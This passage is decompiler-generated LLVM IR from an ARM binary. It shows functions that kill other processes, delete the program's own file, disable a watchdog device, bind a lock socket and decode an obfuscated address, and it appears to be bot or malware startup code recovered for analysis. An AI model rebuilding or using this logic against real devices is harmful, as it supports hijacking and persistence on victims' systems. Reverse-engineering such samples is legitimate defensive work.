  %v2_10b4c = call i32 @function_146ac(i32 %v2_1073c, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_10b5c = call i32 @function_146ac(i32 %v2_1078c, i32 64)
  %v1_10b64 = call i32 @_sleep(i32 1)
  store i32 %v1_10710, i32* @r4, align 4
  %v0_10b6c = load i32, i32* @r7, align 4
  store i32 %v0_10b6c, i32* @r5, align 4
  br label %dec_label_pc_10670.backedge

dec_label_pc_10b74:                               ; preds = %dec_label_pc_1089c
  %v0_10b74 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_10b7c = call i32 @_kill(i32 %v0_10b74, i32 9)
  %v0_108b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_108b4

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10960.backedge, %dec_label_pc_108d8
  %v1_10b88 = call i32 @function_13c30(i32 12)
  %v1_10b90 = call i32 @function_13c30(i32 13)
  %v1_10b98 = call i32 @function_13c30(i32 14)
  %v1_10ba0 = call i32 @function_13c30(i32 15)
  %v1_10ba8 = call i32 @function_13c30(i32 16)
  %v1_10bb0 = call i32 @_close(i32 %v2_108c8)
  br label %dec_label_pc_10b40

; uselistorder directives
  uselistorder i32 %v1_10ae8., { 1, 0 }
  uselistorder i1 %v9_10ae4, { 1, 0 }
  uselistorder i32 %v0_10ae8, { 1, 0 }
  uselistorder i32 %v1_10ab4., { 1, 0 }
  uselistorder i1 %v9_10ab0, { 1, 0 }
  uselistorder i32 %v0_10ab4, { 1, 0 }
  uselistorder i32 %v1_10a80., { 1, 0 }
  uselistorder i1 %v9_10a7c, { 1, 0 }
  uselistorder i32 %v0_10a80, { 1, 0 }
  uselistorder i32 %v1_10a4c., { 1, 0 }
  uselistorder i1 %v9_10a48, { 1, 0 }
  uselistorder i32 %v0_10a4c, { 1, 0 }
  uselistorder i32 %v1_10a18., { 1, 2, 0 }
  uselistorder i1 %v9_10a14, { 1, 0 }
  uselistorder i32 %v0_10a18, { 1, 0 }
  uselistorder i32 %v0_10a24, { 1, 0 }
  uselistorder i32 %v3_1096c, { 1, 0 }
  uselistorder i32 %v2_108c8, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v2_108a4, { 1, 2, 0 }
  uselistorder i32 %v1_10674, { 1, 0 }
  uselistorder i32 %stack_var_-8420.1.be, { 1, 0 }
  uselistorder i32 %v3_107ec, { 1, 2, 0 }
  uselistorder i32 %v1_106f4, { 1, 0 }
  uselistorder i32 %v1_106a4, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %v1_10680, { 1, 0, 2 }
  uselistorder i32 %stack_var_-8420.0, { 1, 0 }
  uselistorder i32 %v2_1078c, { 1, 0, 2 }
  uselistorder i32 %v2_1073c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v3_10608, { 1, 0 }
  uselistorder i32 %v2_105d4, { 2, 0, 1 }
  uselistorder i32 %v3_10584, { 1, 0 }
  uselistorder i32 %v2_10578, { 3, 2, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 %v3_10504, { 1, 2, 0 }
  uselistorder i32 %v3_104b4, { 1, 2, 0 }
  uselistorder i32 %storemerge173, { 1, 0 }
  uselistorder i32 %v0_10444, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 20, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 56, 50, 11, 44, 41, 61, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 1, 42, 43, 45, 46, 48, 47, 49, 51, 52, 53, 54, 55, 57, 58, 59, 60, 62 }
  uselistorder i32 64, { 7, 11, 8, 12, 13, 14, 9, 15, 16, 17, 0, 18, 19, 20, 21, 1, 22, 23, 24, 10, 25, 26, 27, 2, 28, 29, 30, 3, 31, 32, 33, 4, 34, 35, 36, 37, 38, 5, 39, 40, 41, 42, 43, 6, 44, 45 }
  uselistorder i32 (i32)* @_closedir, { 2, 1, 0 }
  uselistorder i32 (i32)* @_readdir, { 7, 8, 0, 6, 5, 4, 2, 3, 1 }
  uselistorder i32 (i32)* @_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @_readlink, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1d9b0.163, { 1, 0, 2, 3 }
  uselistorder i32 4096, { 5, 9, 1, 2, 6, 7, 0, 8, 3, 4 }
  uselistorder i32* @global_var_1d9b4.155, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10b40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10b04, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10978, { 1, 0 }
  uselistorder label %dec_label_pc_108bc, { 1, 0 }
  uselistorder label %dec_label_pc_108b4, { 1, 0 }
  uselistorder label %dec_label_pc_10670.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10858, { 1, 0 }
  uselistorder label %dec_label_pc_10680, { 1, 0 }
  uselistorder label %dec_label_pc_10680.preheader, { 1, 0 }
  uselistorder label %bb215, { 1, 0 }
  uselistorder label %dec_label_pc_10530, { 1, 0 }
  uselistorder label %dec_label_pc_104e0, { 1, 0 }
}

define i32 @function_10bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10bc4:
  store i32 ptrtoint (i32* @global_var_10d4c.165 to i32), i32* @global_var_1d90c.167, align 4
  %v1_10bd0 = load i32, i32* @r0, align 4
  ret i32 %v1_10bd0
}

define i32 @function_10bdc() local_unnamed_addr {
dec_label_pc_10bdc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10bdc = load i32, i32* @r4, align 4
  %v9_10bdc = load i32, i32* @r6, align 4
  %v15_10bdc = load i32, i32* @r8, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_10bf8 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1d904.169 to i32), i32* @r6, align 4
  %v7_10c00 = icmp eq i32 %v3_10bf8, -1
  store i32 %v3_10bf8, i32* @global_var_1d904.169, align 4
  br i1 %v7_10c00, label %dec_label_pc_10cc0, label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bdc
  %v2_10c0c = ptrtoint i32* %stack_var_-28 to i32
  %v0_10c10 = load i32, i32* %r4.global-to-local, align 4
  %v5_10c20 = call i32 @_setsockopt(i32 %v3_10bf8, i32 %v0_10c10, i32 2, i32 %v2_10c0c, i32 4)
  %v2_10c24 = load i32, i32* @global_var_1d904.169, align 4
  store i32 %v2_10c24, i32* %r4.global-to-local, align 4
  %v3_10c34 = call i32 @_fcntl(i32 %v2_10c24, i32 3, i32 0)
  %v1_10c3c = or i32 %v3_10c34, 2048
  %v3_10c44 = call i32 @_fcntl(i32 %v2_10c24, i32 4, i32 %v1_10c3c)
  store i32 ptrtoint (i8** @global_var_1d910.171 to i32), i32* @r8, align 4
  %v2_10c4c = load i8, i8* bitcast (i8** @global_var_1d910.171 to i8*), align 4
  %v2_10c50 = icmp eq i8 %v2_10c4c, 0
  br i1 %v2_10c50, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_10c0c
  br label %bb

.thread:                                          ; preds = %dec_label_pc_10c0c
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_10c88 = call i32 @___errno_location()
  %v0_10c8c = load i32, i32* @r5, align 4
  %v2_10c8c = inttoptr i32 %v0_10c88 to i32*
  store i32 %v0_10c8c, i32* %v2_10c8c, align 4
  %v2_10c90 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10c90, i32* @r7, align 4
  store i32 %v0_10c88, i32* %r4.global-to-local, align 4
  %v2_10c9c = load i32, i32* @global_var_1d904.169, align 4
  %v3_10ca4 = call i32 @_bind(i32 %v2_10c9c, i32 %v2_10c90, i32 16)
  %v7_10ca8 = icmp eq i32 %v3_10ca4, -1
  br i1 %v7_10ca8, label %dec_label_pc_10cc8, label %dec_label_pc_10cb0

dec_label_pc_10cb0:                               ; preds = %bb
  %v2_10cb8 = load i32, i32* @global_var_1d904.169, align 4
  %v2_10cbc = call i32 @_listen(i32 %v2_10cb8, i32 1)
  br label %dec_label_pc_10cc0

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_10cd4, %dec_label_pc_10cb0
  %v20_10cc4 = phi i32 [ %v3_10bf8, %dec_label_pc_10bdc ], [ %v0_10d24, %dec_label_pc_10cd4 ], [ %v2_10cbc, %dec_label_pc_10cb0 ]
  store i32 %v3_10bdc, i32* @r4, align 4
  store i32 %v9_10bdc, i32* @r6, align 4
  store i32 %v15_10bdc, i32* @r8, align 4
  ret i32 %v20_10cc4

dec_label_pc_10cc8:                               ; preds = %bb
  %v0_10cc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10cc8 = inttoptr i32 %v0_10cc8 to i32*
  %v2_10cc8 = load i32, i32* %v1_10cc8, align 4
  %v7_10ccc = icmp eq i32 %v2_10cc8, 99
  br i1 %v7_10ccc, label %dec_label_pc_10d2c, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10d2c, %bb21, %dec_label_pc_10cc8
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_10cec = load i32, i32* @global_var_1d904.169, align 4
  %v3_10d04 = call i32 @_connect(i32 %v2_10cec, i32 %v2_10c90, i32 16)
  %v1_10d0c = call i32 @_sleep(i32 5)
  %v2_10d10 = load i32, i32* @global_var_1d904.169, align 4
  %v1_10d14 = call i32 @_close(i32 %v2_10d10)
  %v1_10d20 = call i32 @function_fec0(i32 58811)
  %v0_10d24 = call i32 @function_10bdc()
  br label %dec_label_pc_10cc0

dec_label_pc_10d2c:                               ; preds = %dec_label_pc_10cc8
  %v2_10d2c = load i8, i8* bitcast (i8** @global_var_1d910.171 to i8*), align 4
  %v3_10d2c = zext i8 %v2_10d2c to i32
  %v1_10d30 = load i32, i32* @r5, align 4
  %v9_10d30 = icmp eq i32 %v3_10d2c, %v1_10d30
  br i1 %v9_10d30, label %dec_label_pc_10cd4, label %bb21

bb21:                                             ; preds = %dec_label_pc_10d2c
  %v2_10d38 = trunc i32 %v1_10d30 to i8
  store i8 %v2_10d38, i8* bitcast (i8** @global_var_1d910.171 to i8*), align 4
  br label %dec_label_pc_10cd4

; uselistorder directives
  uselistorder i32 %v3_10bf8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_fec0, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @_listen, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @_bind, { 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1d910.171 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1d910.171, { 1, 0 }
  uselistorder label %dec_label_pc_10cd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10cc0, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_10d4c() local_unnamed_addr {
dec_label_pc_10d4c:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10d4c = load i32, i32* @r4, align 4
  store i32 %v3_10d4c, i32* %stack_var_-16, align 4
  %v1_10d54 = call i32 @function_13ce8(i32 3)
  %v3_10d60 = call i32 @function_13c04(i32 3, i32* null)
  %v1_10d64 = inttoptr i32 %v3_10d60 to i8*
  %v2_10d64 = call i32 @function_11ac0(i8* %v1_10d64)
  store i32 %v2_10d64, i32* @r5, align 4
  %v1_10d70 = call i32 @function_13c30(i32 3)
  %v0_10d74 = load i32, i32* @r5, align 4
  %v2_10d74 = icmp eq i32 %v0_10d74, 0
  br i1 %v2_10d74, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_10d4c
  ret i32 %v1_10d70

bb5:                                              ; preds = %dec_label_pc_10d4c
  %v1_10d80 = add i32 %v0_10d74, 4
  %v2_10d80 = inttoptr i32 %v1_10d80 to i32*
  %v3_10d80 = load i32, i32* %v2_10d80, align 4
  store i32 %v3_10d80, i32* @r4, align 4
  %v0_10d84 = call i32 @function_117dc()
  %v0_10d88 = load i32, i32* @r5, align 4
  %v1_10d88 = inttoptr i32 %v0_10d88 to i8*
  %v2_10d88 = load i8, i8* %v1_10d88, align 1
  %v3_10d88 = zext i8 %v2_10d88 to i32
  %v2_10d8c = urem i32 %v0_10d84, %v3_10d88
  %v0_10d90 = load i32, i32* @r4, align 4
  %v4_10d90 = mul nuw nsw i32 %v2_10d8c, 4
  %v5_10d90 = add i32 %v0_10d90, %v4_10d90
  %v6_10d90 = inttoptr i32 %v5_10d90 to i32*
  %v7_10d90 = load i32, i32* %v6_10d90, align 4
  store i32 %v7_10d90, i32* @global_var_1d9bc.175, align 4
  %v2_10d9c = call i32 @function_11a9c(i32 %v0_10d88, i32 %v3_10d88)
  %v1_10da4 = call i32 @function_13ce8(i32 4)
  %v3_10db0 = call i32 @function_13c04(i32 4, i32* null)
  %v4_10db0 = inttoptr i32 %v3_10db0 to i8*
  %v2_10db4 = add i32 %v3_10db0, 1
  %v3_10db4 = inttoptr i32 %v2_10db4 to i8*
  %v4_10db4 = load i8, i8* %v3_10db4, align 1
  %v3_10db8 = load i8, i8* %v4_10db0, align 1
  store i8 %v4_10db4, i8* bitcast (i32* @global_var_1d9bb.176 to i8*), align 4
  store i8 %v3_10db8, i8* bitcast (i32* @global_var_1d9ba.177 to i8*), align 4
  %v2_10dd0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10dd0, i32* @r4, align 4
  %v1_10dd4 = call i32 @function_13c30(i32 4)
  %v0_10dd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10dd8, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  %v13_10dd0 = ptrtoint i32* %stack_var_0 to i32
  %v3_10dd8 = load i32, i32* @r1, align 4
  %v4_10dd8 = inttoptr i32 %v3_10dd8 to i16*
  %v5_10dd8 = trunc i32 %v13_10dd0 to i16
  store i16 %v5_10dd8, i16* %v4_10dd8, align 2
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  ret i32 %v1_10dd4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_10ddc(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10ddc:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp13 = call i8 @__decompiler_undefined_function_1()
  %tmp19 = call i8 @__decompiler_undefined_function_1()
  %tmp23 = call i8 @__decompiler_undefined_function_1()
  %tmp27 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i8 @__decompiler_undefined_function_1()
  %tmp37 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10ddc = load i32, i32* @r4, align 4
  store i32 %v3_10ddc, i32* %stack_var_-36, align 4
  %v6_10ddc = load i32, i32* @r5, align 4
  %v15_10ddc = load i32, i32* @r8, align 4
  %v2_10dec = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_10dec, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_10df4 = load i32, i32* %arg2, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_10dfc = call i32 @_unlink(i32 %v2_10df4)
  %v1_10e04 = call i32 @_sigemptyset(i32 %v2_10dec)
  %v2_10e10 = call i32 @_sigaddset(i32 %v2_10dec, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_10e20 = call i32 @_sigprocmask()
  %v2_10e2c = call i32 @_signal(i32 17, i32 1)
  %v2_10e38 = call i32 @_signal(i32 5, i32 ptrtoint (i32* @global_var_10bc4.179 to i32))
  %v3_10e44 = call i32 @_open(i32 ptrtoint ([14 x i8]* @global_var_14fc0.181 to i32), i32 2)
  %v7_10e48 = icmp eq i32 %v3_10e44, -1
  store i32 %v3_10e44, i32* @r4, align 4
  br i1 %v7_10e48, label %dec_label_pc_111cc, label %dec_label_pc_10e54

dec_label_pc_10e54:                               ; preds = %dec_label_pc_111cc, %dec_label_pc_10ddc
  %v0_10e68 = phi i32 [ %v3_111d4, %dec_label_pc_111cc ], [ %v3_10e44, %dec_label_pc_10ddc ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10e6c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10e6c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_10e74 = call i32 @_ioctl(i32 %v0_10e68, i32 -2147199228, i32 %v2_10e6c, i32 1, i32 1)
  %v0_10e78 = load i32, i32* @r4, align 4
  %v1_10e7c = call i32 @_close(i32 %v0_10e78)
  br label %dec_label_pc_10e80

dec_label_pc_10e80:                               ; preds = %dec_label_pc_111cc, %dec_label_pc_10e54
  %v1_10e84 = call i32 @_chdir(i32 ptrtoint (i32* @global_var_14f70.78 to i32))
  %v0_10e88 = call i32 @function_148c4()
  store i32 ptrtoint (i32* @global_var_1d9ac.143 to i32), i32* @fp, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_10ea4 = ptrtoint i8* %stack_var_-106 to i32
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1d9bb.176 to i8*), align 4
  store i32 902487617, i32* @global_var_1d9bc.175, align 4
  store i8 0, i8* bitcast (i32* @global_var_1d9ba.177 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1d9b9.186 to i8*), align 4
  store i32 %v0_10e88, i32* @global_var_1d9ac.143, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i8 2, i8* bitcast (i8** @global_var_1d9b8.174 to i8*), align 4
  %v0_10ed0 = load i32, i32* @r6, align 4
  %v1_10ed0 = inttoptr i32 %v0_10ed0 to i32*
  %v2_10ed0 = load i32, i32* %v1_10ed0, align 4
  store i32 %v2_10ed0, i32* @r5, align 4
  %v4_10ed4 = call i32 @_memcpy(i32 %v2_10ea4, i32 ptrtoint ([3 x i8]* @global_var_15014.188 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_15010.203 to i32), i32* @r4, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_13c30.198 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_10bdc.191 to i32), i32 ptrtoint (i32* @global_var_13ce8.193 to i32)), i32 80900), i32 ptrtoint (i32* @global_var_13da0.196 to i32))), i32 168052), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10bc4.179 to i32), i32* %r2.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_13c30.198 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_10bdc.191 to i32), i32 ptrtoint (i32* @global_var_13ce8.193 to i32)), i32 80900), i32 ptrtoint (i32* @global_var_13da0.196 to i32))), i32 168052), i32 0), label %dec_label_pc_110d0, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10e80
  %v3_10f3c = load i8, i8* %stack_var_-106, align 1
  %v4_10f3c = sext i8 %v3_10f3c to i32
  store i32 %v4_10f3c, i32* %r2.global-to-local, align 4
  %v4_10f40 = zext i8 %tmp37 to i32
  store i32 %v4_10f40, i32* %r3.global-to-local, align 4
  %v0_10f44 = load i32, i32* @r5, align 4
  store i8 %tmp37, i8* %stack_var_-72, align 1
  %v1_10f50 = inttoptr i32 %v0_10f44 to i8*
  %v2_10f50 = call i32 @function_1460c(i8* %v1_10f50)
  %v0_10f58 = load i32, i32* @r7, align 4
  %v2_10f5c = srem i32 %v0_10f58, %v2_10f50
  %v4_10f60 = zext i8 %tmp35 to i32
  store i32 %v4_10f60, i32* %r2.global-to-local, align 4
  %v4_10f64 = zext i8 %tmp34 to i32
  store i32 %v4_10f64, i32* %r3.global-to-local, align 4
  %v0_10f68 = load i32, i32* @r5, align 4
  %v2_10f68 = add i32 %v0_10f68, %v2_10f5c
  %v3_10f68 = inttoptr i32 %v2_10f68 to i8*
  %v4_10f68 = load i8, i8* %v3_10f68, align 1
  %v6_10f68 = zext i8 %v4_10f68 to i32
  store i32 %v6_10f68, i32* %r4.global-to-local, align 4
  %v1_10f78 = inttoptr i32 %v0_10f68 to i8*
  %v2_10f78 = call i32 @function_1460c(i8* %v1_10f78)
  %v2_10f84 = srem i32 4, %v2_10f78
  %v1_10f88 = sub nuw nsw i32 -1, %v6_10f68
  store i32 %v1_10f88, i32* %r4.global-to-local, align 4
  %v0_10f8c = load i32, i32* @r5, align 4
  %v2_10f8c = add i32 %v0_10f8c, %v2_10f84
  %v3_10f8c = inttoptr i32 %v2_10f8c to i8*
  %v4_10f8c = load i8, i8* %v3_10f8c, align 1
  %v6_10f8c = zext i8 %v4_10f8c to i32
  %v4_10f90 = zext i8 %tmp31 to i32
  store i32 %v4_10f90, i32* %r2.global-to-local, align 4
  %v1_10f98 = sub nuw nsw i32 -82, %v6_10f68
  %v1_10f9c = sub nuw nsw i32 -1, %v6_10f8c
  store i32 %v1_10f9c, i32* %r3.global-to-local, align 4
  %v1_10fa4 = urem i32 %v1_10f98, 256
  %v2_10fa8 = add nsw i32 %v1_10fa4, %v1_10f9c
  store i32 %v2_10fa8, i32* %r4.global-to-local, align 4
  %v1_10fb4 = inttoptr i32 %v0_10f8c to i8*
  %v2_10fb4 = call i32 @function_1460c(i8* %v1_10fb4)
  %v2_10fc0 = srem i32 6, %v2_10fb4
  %v0_10fc4 = load i32, i32* @r5, align 4
  %v2_10fc4 = add i32 %v0_10fc4, %v2_10fc0
  %v3_10fc4 = inttoptr i32 %v2_10fc4 to i8*
  %v4_10fc4 = load i8, i8* %v3_10fc4, align 1
  %v6_10fc4 = zext i8 %v4_10fc4 to i32
  %v4_10fc8 = zext i8 %tmp27 to i32
  store i32 %v4_10fc8, i32* %r2.global-to-local, align 4
  %v1_10fd0 = sub nuw nsw i32 -1, %v6_10fc4
  store i32 %v1_10fd0, i32* %r3.global-to-local, align 4
  %v0_10fd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fd8 = urem i32 %v0_10fd8, 256
  %v2_10fdc = add nsw i32 %v1_10fd8, %v1_10fd0
  store i32 %v2_10fdc, i32* %r4.global-to-local, align 4
  %v1_10fe8 = inttoptr i32 %v0_10fc4 to i8*
  %v2_10fe8 = call i32 @function_1460c(i8* %v1_10fe8)
  %v2_10ff4 = srem i32 8, %v2_10fe8
  %v0_10ff8 = load i32, i32* @r5, align 4
  %v2_10ff8 = add i32 %v0_10ff8, %v2_10ff4
  %v3_10ff8 = inttoptr i32 %v2_10ff8 to i8*
  %v4_10ff8 = load i8, i8* %v3_10ff8, align 1
  %v6_10ff8 = zext i8 %v4_10ff8 to i32
  %v4_10ffc = zext i8 %tmp23 to i32
  store i32 %v4_10ffc, i32* %r2.global-to-local, align 4
  %v1_11004 = sub nuw nsw i32 -1, %v6_10ff8
  store i32 %v1_11004, i32* %r3.global-to-local, align 4
  %v0_1100c = load i32, i32* %r4.global-to-local, align 4
  %v1_1100c = urem i32 %v0_1100c, 256
  %v2_11010 = add nsw i32 %v1_1100c, %v1_11004
  store i32 %v2_11010, i32* %r4.global-to-local, align 4
  %v1_1101c = inttoptr i32 %v0_10ff8 to i8*
  %v2_1101c = call i32 @function_1460c(i8* %v1_1101c)
  %v2_11028 = srem i32 10, %v2_1101c
  %v0_1102c = load i32, i32* @r5, align 4
  %v2_1102c = add i32 %v0_1102c, %v2_11028
  %v3_1102c = inttoptr i32 %v2_1102c to i8*
  %v4_1102c = load i8, i8* %v3_1102c, align 1
  %v6_1102c = zext i8 %v4_1102c to i32
  %v4_11030 = zext i8 %tmp19 to i32
  store i32 %v4_11030, i32* %r2.global-to-local, align 4
  %v1_11038 = sub nuw nsw i32 -1, %v6_1102c
  store i32 %v1_11038, i32* %r3.global-to-local, align 4
  %v0_11040 = load i32, i32* %r4.global-to-local, align 4
  %v1_11040 = urem i32 %v0_11040, 256
  %v2_11044 = add nsw i32 %v1_11040, %v1_11038
  store i32 %v2_11044, i32* %r4.global-to-local, align 4
  %v1_11050 = inttoptr i32 %v0_1102c to i8*
  %v2_11050 = call i32 @function_1460c(i8* %v1_11050)
  %v2_1105c = srem i32 12, %v2_11050
  %v0_11060 = load i32, i32* @r5, align 4
  %v2_11060 = add i32 %v0_11060, %v2_1105c
  %v3_11060 = inttoptr i32 %v2_11060 to i8*
  %v4_11060 = load i8, i8* %v3_11060, align 1
  %v6_11060 = zext i8 %v4_11060 to i32
  %v0_11064 = load i32, i32* %r4.global-to-local, align 4
  %v1_11068 = sub nuw nsw i32 -1, %v6_11060
  store i32 %v1_11068, i32* %r3.global-to-local, align 4
  %fold = add i32 %v0_11064, %v1_11068
  %v1_11074 = urem i32 %fold, 256
  %v2_11078 = urem i32 %v1_11074, 9
  %v1_1107c = load i32, i32* @r7, align 4
  %v6_1107c = shl i32 %v2_11078, %v1_1107c
  %v2_11084 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11084, i32* %r2.global-to-local, align 4
  %v1_11088 = and i32 %v6_1107c, 1020
  %v2_11090 = add i32 %v1_11088, %v2_11084
  %v2_11094 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_11094, i32* @r4, align 4
  %v1_1109c = add i32 %v2_11090, -172
  %v2_1109c = inttoptr i32 %v1_1109c to i32*
  %v3_1109c = load i32, i32* %v2_1109c, align 4
  call void @__pseudo_branch(i32 %v3_1109c)
  %v0_110a0 = load i32, i32* @r5, align 4
  %v2_110a8 = inttoptr i32 %v0_110a0 to i8*
  %v3_110a8 = call i32 @function_149ec(i8* %v2_110a8, i32 %v2_11094)
  store i32 %v3_110a8, i32* @r5, align 4
  %v2_110b8 = call i32 @function_146ac(i32 %v2_10ea4, i32 18)
  %v2_110c4 = call i32 @function_146ac(i32 %v2_11094, i32 12)
  %v0_110c8 = load i32, i32* @r5, align 4
  %v1_110c8 = urem i32 %v0_110c8, 256
  %v2_110c8 = icmp eq i32 %v1_110c8, 0
  br i1 %v2_110c8, label %dec_label_pc_110d0, label %dec_label_pc_111e8

dec_label_pc_110d0:                               ; preds = %dec_label_pc_10f3c, %dec_label_pc_10e80, %dec_label_pc_111e8
  %v2_110d4 = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_110d4, i32* @sl, align 4
  %v0_110d8 = call i32 @function_10bdc()
  %v1_110dc = call i32 @function_11834(i32 %v0_110d8)
  %v2_110e8 = call i32 @function_146ac(i32 %v2_110d4, i32 32)
  %v0_110ec = load i32, i32* @r8, align 4
  %v7_110ec = icmp eq i32 %v0_110ec, 2
  br i1 %v7_110ec, label %dec_label_pc_111f4, label %dec_label_pc_110f4

dec_label_pc_110f4:                               ; preds = %dec_label_pc_111f4, %dec_label_pc_110d0, %dec_label_pc_11204
  %v0_110f4 = call i32 @function_117dc()
  %v1_110f8 = mul i32 %v0_110f4, 4
  %v3_110fc = and i32 %v1_110f8, 12
  %v2_11104 = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_11104, i32* @r5, align 4
  %v1_11108 = add nuw nsw i32 %v3_110fc, 12
  store i32 %v1_11108, i32* @r4, align 4
  %v2_11114 = call i32 @function_11890(i32 %v2_11104, i32 %v1_11108)
  %v2_1111c = ptrtoint i32* %stack_var_-36 to i32
  %v1_11120 = load i32, i32* @r4, align 4
  %v2_11120 = add i32 %v1_11120, %v2_1111c
  store i32 %v2_11120, i32* %r3.global-to-local, align 4
  %v0_11124 = load i32, i32* @r6, align 4
  %v1_11124 = inttoptr i32 %v0_11124 to i32*
  %v2_11124 = load i32, i32* %v1_11124, align 4
  store i32 %v2_11124, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
